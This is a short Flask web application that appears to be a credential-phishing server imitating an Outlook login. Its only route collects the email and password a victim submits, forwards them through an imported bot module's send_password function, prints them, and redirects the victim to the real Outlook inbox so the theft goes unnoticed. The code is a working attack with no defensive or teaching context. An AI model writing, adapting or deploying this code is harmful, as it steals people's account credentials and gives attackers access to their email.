from flask import Flask, jsonify, request, render_template, redirect
import os
import bot

app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def hello():
    if request.method == "POST":
        email = request.form['email']
        password = request.form['password']
        bot.send_password(f'email: {email}\nsenha: {password}')
        print(f'email: {email}\nsenha: {password}')
        return redirect('https://outlook.live.com/mail/inbox')
    return render_template("index.html")

if __name__ == '__main__':
            app.run(host='0.0.0.0', port=5001, debug=True)
